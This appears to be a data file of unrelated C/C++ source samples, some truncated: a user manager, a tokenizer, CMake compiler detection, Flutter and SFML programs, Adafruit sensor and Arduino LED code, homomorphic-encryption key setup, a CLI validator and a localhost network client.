    "#include \"GerenciadorDeUsuario.h\"\n#include <iostream>\n\nGerenciadorDeUsuario::GerenciadorDeUsuario(int maximo) {\n    this->maximoUsuarios = maximo;\n    this->quantidadeUsuarios = 0;\n    this->usuarios = new Usuario*[maximo];\n}\n\nGerenciadorDeUsuario::~GerenciadorDeUsuario() {\n    for (int i = 0; i < quantidadeUsuarios; i++) {\n        delete usuarios[i];\n    }\n    delete[] usuarios;\n}\n\nbool GerenciadorDeUsuario::adicionarUsuario(Usuario* u) {\n    if (quantidadeUsuarios >= maximoUsuarios) return false;\n    while(int i = 0 < quantidadeUsuarios){\n        if ((usuarios[i]->getId()) == (u->getId())) return false;\n        i++;\n    }\n    usuarios[quantidadeUsuarios] = u;\n    quantidadeUsuarios++;\n    return true;\n}\n\nUsuario* GerenciadorDeUsuario::getUsuario(int id) {\n    for (int i = 0; i < quantidadeUsuarios; i++) {\n        if (usuarios[i]->getId() == id) {\n            return usuarios[i];\n        }\n    }\n    return nullptr;\n}\n\nUsuario** GerenciadorDeUsuario::getUsuarios() {\n    return usuarios;\n}\n\nint GerenciadorDeUsuario::getQuantidade() {\n    return quantidadeUsuarios;\n}\n\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <assert.h>\r\n#include <string.h>\r\n#include <ctype.h>\r\n#include <stack>\r\n#include <iostream>\r\n#include <vector>\r\n#include <map>\r\n\r\nusing namespace std;\r\n\r\n/*** Enums and Print Functions for Terminals and Non-Terminals  **********************/\r\n\r\n#define MAX_SYMBOL_NAME_SIZE 25\r\n\r\n// All of the terminals in the language\r\ntypedef enum {\r\n    T_eof = 0,  // 0: end of file\r\n    T_num,      // 1: numbers\r\n    T_plus,     // 2: +\r\n    T_minus,    // 3: - \r\n    T_times,    // 4: *\r\n    T_period,   // 5: .\r\n    T_bar,      // 6: | \r\n    T_openparen,    // 7: (\r\n    T_closeparen    // 8: )\r\n} token_type;\r\n\r\nint main() {\r\n    int cur_int = getchar();  // Read input as int to capture EOF\r\n    map<char, token_type> tokentl = {\r\n        {'0', T_num}, {'1', T_num}, {'2', T_num}, {'3', T_num},\r\n        {'4', T_num}, {'5', T_num}, {'6', T_num}, {'7', T_num}, \r\n        {'8', T_num}, {'9', T_num}, {'+', T_plus}, {'-', T_minus}, \r\n        {'*', T_times}, {'.', T_period}, {'|', T_bar}, {'(', T_openparen}, \r\n        {')', T_closeparen}\r\n    };\r\n    \r\n    vector<token_type> tokens;\r\n    bool was_int = false;\r\n\r\n    // Loop while not EOF\r\n    while (cur_int != EOF) {\r\n        if (cur_int != ' ' && cur_int != '\\n') {  // Only process non-whitespace characters\r\n            // Only cast after checking cur_int is not EOF\r\n            char cur_char = static_cast<char>(cur_int);  // Now safe to cast\r\n            \r\n            cout << \"current char: \" << cur_char << endl;  // Print the current character\r\n\r\n            if (tokentl.count(cur_char) > 0) {  // If character exists in the map\r\n                if (tokentl[cur_char] == T_num) {\r\n                    if (!was_int) {  // Only add number token if it hasn't already\r\n                        was_int = true;\r\n                        tokens.push_back(tokentl[cur_char]);\r\n                    }\r\n                } else {  // If not a number, add token\r\n                    was_int = false;\r\n                    tokens.push_back(tokentl[cur_char]);\r\n                }\r\n            } else {\r\n                // Handle unexpected characters\r\n                cout << \"ERROR! Unexpected character: \" << cur_char << endl;\r\n            }\r\n        }\r\n        // Output all the tokens\r\n        for (unsigned int i = 0; i < tokens.size(); i++) {\r\n            cout << tokens[i] << endl;\r\n        }\r\n        cout << endl;\r\n\r\n        // Read the next character\r\n        cur_int = getchar();\r\n    }\r\n\r\n    // Add end of file token after escaping loop\r\n    cout << \"ESCAPED LOOP\" << endl;\r\n    tokens.push_back(T_eof);\r\n\r\n    // Output all the tokens\r\n    for (unsigned int i = 0; i < tokens.size(); i++) {\r\n        cout << tokens[i] << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"widgets\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*!\n *  @file DHT_U.cpp\n *\n *  Temperature & Humidity Unified Sensor Library\n *\n *  This is a library for DHT series of low cost temperature/humidity sensors.\n *\n *  You must have Adafruit Unified Sensor Library library installed to use this\n * class.\n *\n *  Adafruit invests time and resources providing this open source code,\n *  please support Adafruit andopen-source hardware by purchasing products\n *  from Adafruit!\n */\n#include \"DHT_U.h\"\n\n/*!\n *  @brief  Instantiates a new DHT_Unified class\n *  @param  pin\n *          pin number that sensor is connected\n *  @param  type\n *          type of sensor\n *  @param  count\n *          number of sensors\n *  @param  tempSensorId\n *          temperature sensor id\n *  @param  humiditySensorId\n *          humidity sensor id\n */\nDHT_Unified::DHT_Unified(uint8_t pin, uint8_t type, uint8_t count,\n                         int32_t tempSensorId, int32_t humiditySensorId)\n    : _dht(pin, type, count), _type(type), _temp(this, tempSensorId),\n      _humidity(this, humiditySensorId) {}\n\n/*!\n *  @brief  Setup sensor (calls begin on It)\n */\nvoid DHT_Unified::begin() { _dht.begin(); }\n\n/*!\n *  @brief  Sets sensor name\n *  @param  sensor\n *          Sensor that will be set\n */\nvoid DHT_Unified::setName(sensor_t *sensor) {\n  switch (_type) {\n  case DHT11:\n    strncpy(sensor->name, \"DHT11\", sizeof(sensor->name) - 1);\n    break;\n  case DHT12:\n    strncpy(sensor->name, \"DHT12\", sizeof(sensor->name) - 1);\n    break;\n  case DHT21:\n    strncpy(sensor->name, \"DHT21\", sizeof(sensor->name) - 1);\n    break;\n  case DHT22:\n    strncpy(sensor->name, \"DHT22\", sizeof(sensor->name) - 1);\n    break;\n  default:\n    // TODO: Perhaps this should be an error?  However main DHT library doesn't\n    // enforce restrictions on the sensor type value.  Pick a generic name for\n    // now.\n    strncpy(sensor->name, \"DHT?\", sizeof(sensor->name) - 1);\n    break;\n  }\n  sensor->name[sizeof(sensor->name) - 1] = 0;\n}\n\n/*!\n *  @brief  Sets Minimum Delay Value\n *  @param  sensor\n *          Sensor that will be set\n */\nvoid DHT_Unified::setMinDelay(sensor_t *sensor) {\n  switch (_type) {\n  case DHT11:\n    sensor->min_delay = 1000000L; // 1 second (in microseconds)\n    break;\n  case DHT12:\n    sensor->min_delay = 2000000L; // 2 second (in microseconds)\n    break;\n  case DHT21:\n    sensor->min_delay = 2000000L; // 2 seconds (in microseconds)\n    break;\n  case DHT22:\n    sensor->min_delay = 2000000L; // 2 seconds (in microseconds)\n    break;\n  default:\n    // Default to slowest sample rate in case of unknown type.\n    sensor->min_delay = 2000000L; // 2 seconds (in microseconds)\n    break;\n  }\n}\n\n/*!\n *  @brief  Instantiates a new DHT_Unified Temperature Class\n *  @param  parent\n *          Parent Sensor\n *  @param  id\n *          Sensor id\n */\nDHT_Unified::Temperature::Temperature(DHT_Unified *parent, int32_t id)\n    : _parent(parent), _id(id) {}\n\n/*!\n *  @brief  Reads the sensor and returns the data as a sensors_event_t\n *  @param  event\n *  @return always returns true\n */\nbool DHT_Unified::Temperature::getEvent(sensors_event_t *event) {\n  // Clear event definition.\n  memset(event, 0, sizeof(sensors_event_t));\n  // Populate sensor reading values.\n  event->version = sizeof(sensors_event_t);\n  event->sensor_id = _id;\n  event->type = SENSOR_TYPE_AMBIENT_TEMPERATURE;\n  event->timestamp = millis();\n  event->temperature = _parent->_dht.readTemperature();\n\n  return true;\n}\n\n/*!\n *  @brief  Provides the sensor_t data for this sensor\n *  @param  sensor\n */\nvoid DHT_Unified::Temperature::getSensor(sensor_t *sensor) {\n  // Clear sensor definition.\n  memset(sensor, 0, sizeof(sensor_t));\n  // Set sensor name.\n  _parent->setName(sensor);\n  // Set version and ID\n  sensor->version = DHT_SENSOR_VERSION;\n  sensor->sensor_id = _id;\n  // Set type and characteristics.\n  sensor->type = SENSOR_TYPE_AMBIENT_TEMPERATURE;\n  _parent->setMinDelay(sensor);\n  switch (_parent->_type) {\n  case DHT11:\n    sensor->max_value = 50.0F;\n    sensor->min_value = 0.0F;\n    sensor->resolution = 2.0F;\n    break;\n  case DHT12:\n    sensor->max_value = 60.0F;\n    sensor->min_value = -20.0F;\n    sensor->resolution = 0.5F;\n    break;\n  case DHT21:\n    sensor->max_value = 80.0F;\n    sensor->min_value = -40.0F;\n    sensor->resolution = 0.1F;\n    break;\n  case DHT22:\n    sensor->max_value = 125.0F;\n    sensor->min_value = -40.0F;\n    sensor->resolution = 0.1F;\n    break;\n  default:\n    // Unknown type, default to 0.\n    sensor->max_value = 0.0F;\n    sensor->min_value = 0.0F;\n    sensor->resolution = 0.0F;\n    break;\n  }\n}\n\n/*!\n *  @brief  Instantiates a new DHT_Unified Humidity Class\n *  @param  parent\n *          Parent Sensor\n *  @param  id\n *          Sensor id\n */\nDHT_Unified::Humidity::Humidity(DHT_Unified *parent, int32_t id)\n    : _parent(parent), _id(id) {}\n\n/*!\n *  @brief  Reads the sensor and returns the data as a sensors_event_t\n *  @param  event\n *  @return always returns true\n */\nbool DHT_Unified::Humidity::getEvent(sensors_event_t *event) {\n  // Clear event d",
    "/*\nAuthors: Deevashwer Rathee\nCopyright:\nCopyright (c) 2020 Microsoft Research\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n*/\n\n#include \"LinearHE/utils-HE.h\"\n#include \"seal/util/polyarithsmallmod.h\"\n\nusing namespace std;\nusing namespace sci;\nusing namespace seal;\nusing namespace seal::util;\n\nvoid generate_new_keys(\n        int party,\n        NetIO* io,\n        int slot_count,\n        shared_ptr<SEALContext> &context_,\n        Encryptor* &encryptor_,\n        Decryptor* &decryptor_,\n        Evaluator* &evaluator_,\n        BatchEncoder* &encoder_,\n        GaloisKeys* &gal_keys_,\n        Ciphertext* &zero_,\n        bool verbose)\n{\n    EncryptionParameters parms(scheme_type::BFV);\n    parms.set_poly_modulus_degree(slot_count);\n    parms.set_coeff_modulus(CoeffModulus::Create(slot_count, {60,60,60,38}));\n    parms.set_plain_modulus(prime_mod);\n    // auto context = SEALContext::Create(parms, true, sec_level_type::none);\n    context_ = SEALContext::Create(parms, true, sec_level_type::none);\n    encoder_ = new BatchEncoder(context_);\n    evaluator_ = new Evaluator(context_);\n    if (party == BOB)\n    {\n        KeyGenerator keygen(context_);\n        auto pub_key = keygen.public_key();\n        auto sec_key = keygen.secret_key();\n        auto gal_keys_ = keygen.galois_keys();\n\n        stringstream os;\n        pub_key.save(os);\n        uint64_t pk_size = os.tellp();\n        gal_keys_.save(os);\n        uint64_t gk_size = (uint64_t)os.tellp()-pk_size;\n\n        string keys_ser = os.str();\n        io->send_data(&pk_size, sizeof(uint64_t));\n        io->send_data(&gk_size, sizeof(uint64_t));\n        io->send_data(keys_ser.c_str(), pk_size+gk_size);\n\n#ifdef HE_DEBUG\n        stringstream os_sk;\n        sec_key.save(os_sk);\n        uint64_t sk_size = os_sk.tellp();\n        string keys_ser_sk = os_sk.str();\n        io->send_data(&sk_size, sizeof(uint64_t));\n        io->send_data(keys_ser_sk.c_str(), sk_size);\n#endif\n        encryptor_ = new Encryptor(context_, pub_key);\n        decryptor_ = new Decryptor(context_, sec_key);\n        \n        vector<uint64_t> pod_matrix(slot_count, 0ULL);\n        Plaintext tmp;\n        encoder_->encode(pod_matrix, tmp);\n        zero_ = new Ciphertext;\n        encryptor_->encrypt(tmp, *zero_);\n        \n              \n        \n    }\n    else // party == ALICE\n    {\n        uint64_t pk_size;\n        uint64_t gk_size;\n        io->recv_data(&pk_size, sizeof(uint64_t));\n        io->recv_data(&gk_size, sizeof(uint64_t));\n        char* key_share = new char[pk_size+gk_size];\n        io->recv_data(key_share, pk_size+gk_size);\n        stringstream is;\n        PublicKey pub_key;\n        is.write(key_share, pk_size);\n        pub_key.load(context_, is);\n        gal_keys_ = new GaloisKeys();\n        is.write(key_share+pk_size, gk_size);\n        gal_keys_->load(context_, is);\n        delete[] key_share;\n\n#ifdef HE_DEBUG\n        uint64_t sk_size;\n        io->recv_data(&sk_size, sizeof(uint64_t));\n        char* key_share_sk = new char[sk_size];\n        io->recv_data(key_share_sk, sk_size);\n        stringstream is_sk;\n        SecretKey sec_key;\n        is_sk.write(key_share_sk, sk_size);\n        sec_key.load(context_, is_sk);\n        delete[] key_share_sk;\n        decryptor_ = new Decryptor(context_, sec_key);\n#endif\n        encryptor_ = new Encryptor(context_, pub_key);\n        vector<uint64_t> pod_matrix(slot_count, 0ULL);\n        Plaintext tmp;\n        encoder_->encode(pod_matrix, tmp);\n        zero_ = new Ciphertext;\n        encryptor_->encrypt(tmp, *zero_);\n    }\n    if (verbose) cout << \"Keys Generated (slot_count: \" << slot_count << \")\" << endl;\n}\n\nvoid free_keys(\n        int party,\n        Encryptor* &encryptor_,\n        Decryptor* &decryptor_,\n        Evaluator* &evaluator_,\n        BatchEncoder* &encoder_,\n        GaloisKeys* &gal_keys_,\n        Ciphertext* &zero_)\n{\n    delete encoder_;\n    delete evaluator_;\n    delete encryptor_;\n    if (party == BOB)\n    {\n        delete decryptor_;\n        delete zero_;\n    }\n    else // party ==ALICE\n    {\n#i",
    "#include \"pch.h\"\n#include \"ValidCommand.h\"\n\n\nBEGIN_NAMESPACE_CLI\n/*************** ValidCommand ***************/\n\n//public\nValidCommand::ValidCommand(const std::string& name)\n    : m_CommandName(name)\n    , m_NumMandatoryParameters(0)\n{\n}\n\n//public\nValidCommand& ValidCommand::AddParameter(\n    const std::string& name,\n    const ValidParameterProperties& props)\n{\n    m_Parameters.insert(std::make_pair(name, props));\n\n    if (props.IsMandatory)\n        ++m_NumMandatoryParameters;\n\n    return *this;\n}\n\n//public \nValidCommand& ValidCommand::AddFlag(const std::string& name, const std::string& helperMessage)\n{\n    m_Flags.insert(std::make_pair(name, helperMessage));\n    return *this;\n}\n\n//public\nbool ValidCommand::HasFlag(const std::string& flag) const\n{\n    return m_Flags.find(flag) != m_Flags.end();\n}\n\n//private\nValidParamMap::const_iterator ValidCommand::GetParameterAtIndex(size_t index) const\n{\n    return std::find_if(m_Parameters.begin(), m_Parameters.end(),\n        [index](auto iter)\n        {\n            return iter.second.InOrderIndex == index;\n        });\n}\n\n// static\nOptionType ValidCommand::ConvertStringToOptionType(const std::string& optionType)\n{\n    if (optionType == \"text\")\n        return OptionType::TEXT;\n    \n    if (optionType == \"alphaNumeric\")\n        return OptionType::ALPHA_NUMERIC;\n\n    if (optionType == \"double\")\n        return OptionType::DOUBLE;\n\n    if (optionType == \"integer\")\n        return OptionType::INTEGER;\n\n    if (optionType == \"alphabetical\")\n        return OptionType::ALPHABETICAL;\n\n    if (optionType == \"date\")\n        return OptionType::DATE;\n\n    return OptionType::INVALID;\n}\n\n/*******************************************/\n\nEND_NAMESPACE_CLI",
    "#include <iostream>\n#include <mutex>\n#include <thread>\n#include \"custom_messages.h\"\n#include \"net_All.h\"\n\nusing namespace std;\n\nclass CustomClient : public client_interface<CustomMsgTypes>\n{\npublic:\n\tvoid PingServer()\t\n\t{\n\t\tmessage<CustomMsgTypes> msg;\n\t\tmsg.header.id = CustomMsgTypes::ServerPing;\n\n\t\t// Caution with this...\n\t\tstd::chrono::system_clock::time_point timeNow = std::chrono::system_clock::now();\t\t\n\n\t\tmsg << timeNow;\n\t\tSend(msg);\n\t}\n\n  void SendStringMessage(const char* inputString)\n  {\n    message<CustomMsgTypes> msg;\n    msg.header.id = CustomMsgTypes::StringMessage;\n    while(*inputString != '\\0')\n    {\n      msg << *inputString;\n      inputString++;\n    }\n    Send(msg);\n  }\n};\n\nstd::mutex mtx;\nint main()\n{\n\tCustomClient CC;\n\tCC.Connect(\"127.0.0.1\", 60000);\n  while(true)\n  {\n\t\tif (CC.IsConnected())\n\t\t{\n\t\t\tif (!CC.Incoming().empty())\n\t\t\t{\n\n\t\t\t\tauto msg = CC.Incoming().pop_front().msg;\n\n\t\t\t\tswitch (msg.header.id)\n\t\t\t\t{\n\t\t\t\t  case CustomMsgTypes::ServerAccept:\n\t\t\t\t  {\n\t\t\t\t\t  // Server has responded to a ping request\t\t\t\t\n\t\t\t\t\t  std::cout << \"Server Accepted Connection\\n\";\n            break;\n\t\t\t\t  }\n\n\t\t\t\t  case CustomMsgTypes::ServerPing:\n\t\t\t\t  {\n\t\t\t\t\t  // Server has responded to a ping request\n\t\t\t\t\t  std::chrono::system_clock::time_point timeNow = std::chrono::system_clock::now();\n\t\t\t\t\t  std::chrono::system_clock::time_point timeThen;\n\t\t\t\t\t  msg >> timeThen;\n\t\t\t\t\t  std::cout << \"Ping: \" << std::chrono::duration<double>(timeNow - timeThen).count() << \"\\n\";\n            break;\n\t\t\t\t  }\n          case CustomMsgTypes::StringMessage:\n            {\n              vector<uint8_t> tempVec = msg.body;\n              string toPrint;\n              cout << \"[CLIENT]: Recieved vector size (bytes): \" << tempVec.size() << \"\\n\";\n              for(int i = 0; i < tempVec.size(); i++)\n                toPrint += tempVec[i];\n              cout << \"[CLIENT] Message: \" << toPrint << \"\\n\";\n              break;\n            }\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tstd::cout << \"Server Down. Please reopen client!\\n\";\n      return -1;\n\t\t}\n\t}\n}\n",
    "// Lab7_TD.cpp : This file contains the 'main' function. Program execution begins and ends there. //\n\n#include <iostream>\n#include <SFML/Graphics.hpp>\n#include <SFPhysics.h>\n\nusing namespace std;\nusing namespace sf;\nusing namespace sfp;\n\nint main() {\n    RenderWindow window(VideoMode(800, 600), \"Bounce\");\n    World world(Vector2f(0, 1));\n\n    PhysicsCircle ball;\n    ball.setCenter(Vector2f(50, 50));\n    ball.setRadius(20);\n    world.AddPhysicsBody(ball);\n\n    PhysicsRectangle floor;\n    floor.setSize(Vector2f(800, 20));\n    floor.setCenter(Vector2f(400, 590));\n    floor.setStatic(true);\n    world.AddPhysicsBody(floor);\n\n    PhysicsRectangle leftWall, rightWall, topWall;\n\n    leftWall.setSize(Vector2f(20, 600));\n    leftWall.setCenter(Vector2f(10, 300));\n    leftWall.setStatic(true);\n    world.AddPhysicsBody(leftWall);\n\n    rightWall.setSize(Vector2f(20, 600));\n    rightWall.setCenter(Vector2f(790, 300));\n    rightWall.setStatic(true);\n    world.AddPhysicsBody(rightWall);\n\n    topWall.setSize(Vector2f(800, 20));\n    topWall.setCenter(Vector2f(400, 10));\n    topWall.setStatic(true);\n    world.AddPhysicsBody(topWall);\n\n    PhysicsRectangle centerBox;\n    centerBox.setSize(Vector2f(100, 100));\n    centerBox.setCenter(Vector2f(400, 300));\n    centerBox.setStatic(true);\n    world.AddPhysicsBody(centerBox);\n\n    int thudCount(0);\n    int bangCount(0);\n\n    floor.onCollision = [&thudCount](PhysicsBodyCollisionResult result) {\n        cout << \"thud \" << thudCount << endl;\n        thudCount++;\n    };\n\n    leftWall.onCollision = rightWall.onCollision = topWall.onCollision = [&thudCount](PhysicsBodyCollisionResult result) {\n        cout << \"thud \" << thudCount << endl;\n        thudCount++;\n    };\n\n    centerBox.onCollision = [&bangCount](PhysicsBodyCollisionResult result) {\n        bangCount++;\n        cout << \"bang \" << bangCount << endl;\n        if (bangCount >= 3) {\n            exit(0);\n        }\n    };\n\n    ball.applyImpulse(Vector2f(0.1f, 0.2f));\n\n    Clock clock;\n    Time lastTime(clock.getElapsedTime());\n\n    while (window.isOpen()) {\n        Time currentTime(clock.getElapsedTime());\n        Time deltaTime(currentTime - lastTime);\n        int deltaTimeMS(deltaTime.asMilliseconds());\n        if (deltaTimeMS > 0) {\n            world.UpdatePhysics(deltaTimeMS);\n            lastTime = currentTime;\n        }\n\n        window.clear(Color(0, 0, 0));\n        window.draw(ball);\n        window.draw(floor);\n        window.draw(leftWall);\n        window.draw(rightWall);\n        window.draw(topWall);\n        window.draw(centerBox);\n        window.display();\n\n        Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == Event::Closed) {\n                window.close();\n            }\n        }\n    }\n\n    return 0;\n}\n",
    "#include <Arduino.h>\n\n// led pinout\nconst int blueLed = 2;\nconst int redLed1 = 4;\nconst int redLed2 = 16;\nconst int redLed3 = 17;\nconst int yellowLed = 5;\nconst int greenLed = 18;\n\n// put function declarations here:\nvoid enableLed(int ledPinCode);\nvoid disableLed(int ledPinCode);\nvoid startCountdown();\nvoid lightsOut();\n\nvoid setup()\n{\n  // todo: loop through the array of pins\n  pinMode(blueLed, OUTPUT);\n  pinMode(redLed1, OUTPUT);\n  pinMode(redLed2, OUTPUT);\n  pinMode(redLed3, OUTPUT);\n  pinMode(yellowLed, OUTPUT);\n  pinMode(greenLed, OUTPUT);\n\n  Serial.begin(115200);\n  // seed the randomness\n  randomSeed(analogRead(A0)); // if nothing connected to pin 0 then random analog noise should take care of this\n}\n\nvoid loop()\n{\n  // turn on blue led to show the app is running\n  enableLed(blueLed);\n  startCountdown();\n  delay(5000);\n  disableLed(blueLed);\n  delay(2000);\n\n  // turn this into an f1 reaction checker\n}\n\nvoid enableLed(int ledPinCode) {\n  digitalWrite(ledPinCode, HIGH);\n}\n\nvoid disableLed(int ledPinCode) {\n  digitalWrite(ledPinCode, LOW);\n}\n\nvoid startCountdown() {\n  // turn on all leds\n  enableLed(redLed1);\n  enableLed(redLed2);\n  enableLed(redLed3);\n  enableLed(yellowLed);\n  enableLed(greenLed);\n\n  delay(2000); // wait 